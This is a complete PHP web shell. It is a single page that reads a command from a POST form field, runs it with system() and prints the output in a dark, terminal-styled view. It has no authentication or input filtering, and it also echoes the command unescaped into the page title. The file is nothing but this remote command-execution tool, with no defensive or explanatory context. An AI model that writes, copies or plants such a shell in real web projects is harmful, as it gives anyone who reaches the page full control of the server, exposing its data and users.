<?php
	$c = $_POST["c"];
?>
<form method="POST">
	<input name="c" autofocus />
	<input type="submit" hidden />
</form>
<pre>
<?php
	echo "$ " . $c . "\n";
	if (isset($c)) system($c, $r);
?>
</pre>
<title><?=$c?>(ret: <?=$r ?>)</title>
<style>
	* {
		background-color: #000;
	}
	pre,input {
		width: 100%;
		background-color: #222;
		color: #d08222;
	}
</style>
